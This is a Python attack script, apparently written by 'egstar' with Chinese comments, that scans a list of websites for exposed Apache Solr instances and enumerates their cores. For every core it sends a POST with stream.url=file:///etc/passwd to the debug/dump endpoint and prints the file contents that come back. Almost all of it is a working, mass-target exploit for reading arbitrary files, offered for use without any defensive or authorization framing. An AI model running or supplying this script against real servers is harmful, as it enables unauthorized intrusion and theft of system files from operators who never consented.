import argparse
import requests

# 解析命令行参数
parser = argparse.ArgumentParser(description="Check if a website has Solr installed")
parser.add_argument("-u", "--url", help="the URL of the website to check")
parser.add_argument("-f", "--file", help="the path to the file containing URLs to check")

args = parser.parse_args()

# 如果没有指定URL或文件，则输出错误信息并退出
if not args.url and not args.file:
    print("Please specify either a URL or a file containing URLs to check.")
    exit()

# 从文件中读取URL列表
if args.file:
    with open(args.file, "r") as f:
        urls = f.read().splitlines()
else:
    urls = [args.url]

# 打印banner信息
print("\033[1;35;40m")
print("   ______       __      ")
print("  /_  ___\____ |  |  ____")
print("  \   \  / __ \|  | | |—— \ ")
print("———— _ \| |__| |  |_| |—— /")
print("\___|__/ \____/\____/_| \_\ ")
print("                            by egstar")
print("\033[0m")

# 检查每个URL是否存在Solr
for url in urls:
    solr_url = url.strip("/") + "/solr/#"
    response = requests.get(solr_url)

    if response.status_code == 200:
        print(f"\n\n\033[32m[+]\033[0m: \033[32m{url}\033[0m has Solr installed!")

        # 检查/solr/admin/cores目录是否存在
        cores_url = url.strip("/") + "/solr/admin/cores"
        response = requests.get(cores_url)

        if response.status_code == 200:
            print("\033[32m[+]\033[0m: solr admin cores exists!")

            # 获取所有core名称列表
            core_names = list(response.json()["status"].keys())
            print(f"\033[32m[+]\033[0m: core names: {', '.join(core_names)}")

            # 遍历所有core，并发起POST请求
            for core_name in core_names:
                debug_url = url.strip("/") + f"/solr/{core_name}/debug/dump?param=ContentStreams"
                data = {"stream.url": "file:///etc/passwd"}
                response = requests.post(debug_url, data=data)

                if response.status_code == 200:
                    print(f"\033[32m[+]\033[0m: Successfully sent request to {debug_url}")

                    # 解析响应内容中的stream值
                    stream_value = None
                    for line in response.iter_lines():
                        if b'"stream":' in line:
                            stream_value = line.decode("utf-8").split(":", 1)[1].strip('"')
                            break

                    if stream_value is not None:
                        print(f"\033[32m[+]\033[0m: stream value: {stream_value}")
                    else:
                        print("\033[32m[+]\033[0m: Failed to parse stream value from response")
                else:
                    print(f"\033[31m[-]\033[0m: Failed to send request to {debug_url}")
        else:
            print("\033[31m[-]\033[0m: solr admin cores does not exist.")
    else:
        print(f"\033[31m[-]\033[0m: {url} does not have Solr installed.")
